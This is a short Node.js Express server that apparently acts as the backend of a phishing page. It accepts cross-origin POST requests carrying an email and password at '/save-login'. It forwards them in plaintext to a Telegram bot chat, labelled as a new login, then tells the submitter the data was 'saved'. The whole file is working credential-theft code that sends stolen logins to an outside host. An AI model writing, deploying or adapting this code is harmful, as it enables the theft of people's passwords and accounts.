const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.json());

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, x-secret-key');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.post('/save-login', async (req, res) => {
  const { email, password } = req.body;

  if (BOT_TOKEN && CHAT_ID) {
    const text = `🔐 Новый логин\nEmail: ${email}\nPassword: ${password}`;
    try {
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: text
      });
    } catch (e) {}
  }

  res.json({ status: 'saved' });
});

app.listen(process.env.PORT || 3000, '0.0.0.0');
